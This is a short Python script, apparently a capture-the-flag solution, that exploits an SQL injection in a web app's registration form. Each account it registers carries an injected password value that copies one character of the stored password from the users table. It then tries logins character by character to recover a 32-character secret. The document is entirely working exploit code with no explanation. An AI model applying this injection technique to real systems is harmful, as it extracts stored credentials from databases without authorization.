#!/usr/bin/env python3
import time
import requests
url = "https://cool.mc.ax/"
#url = "http://127.0.0.1:5000/"

prefix = "asdfjwfoijweoijfojiewfj"
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
val = ""
for i in range(32):
	username = prefix + str(time.time_ns()).replace("0", "")
	password = f"'||(select substr(password,{i+1},1) from users)||'"
	resp = requests.post(url + "register", data={"username": username, "password": password}).text
	for c in charset:
		
		resp = requests.post(url, data={"username": username, "password": c}).text
		if "Incorrect" not in resp:
			print(c)
			val += c
			break
print(val)